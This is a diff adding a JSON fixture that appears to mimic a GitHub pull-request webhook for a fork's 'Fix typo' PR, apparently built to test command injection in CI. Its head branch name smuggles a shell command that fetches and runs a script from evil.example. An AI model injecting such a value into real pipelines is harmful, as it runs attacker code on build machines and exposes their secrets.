@@ -1,0 +1,16 @@
+{
+  "action": "opened",
+  "number": 7,
+  "pull_request": {
+    "number": 7,
+    "title": "Fix typo",
+    "body": "Small fix.",
+    "html_url": "https://github.com/studio/game/pull/7",
+    "user": {"login": "contributor", "id": 2001},
+    "author_association": "CONTRIBUTOR",
+    "head": {"ref": "fix-typo\"; curl evil.example | sh", "label": "contributor:fix-typo", "repo": {"full_name": "contributor/game", "fork": true}},
+    "base": {"ref": "main", "repo": {"full_name": "studio/game"}}
+  },
+  "repository": {"full_name": "studio/game", "visibility": "public"},
+  "sender": {"login": "contributor", "id": 2001}
+}
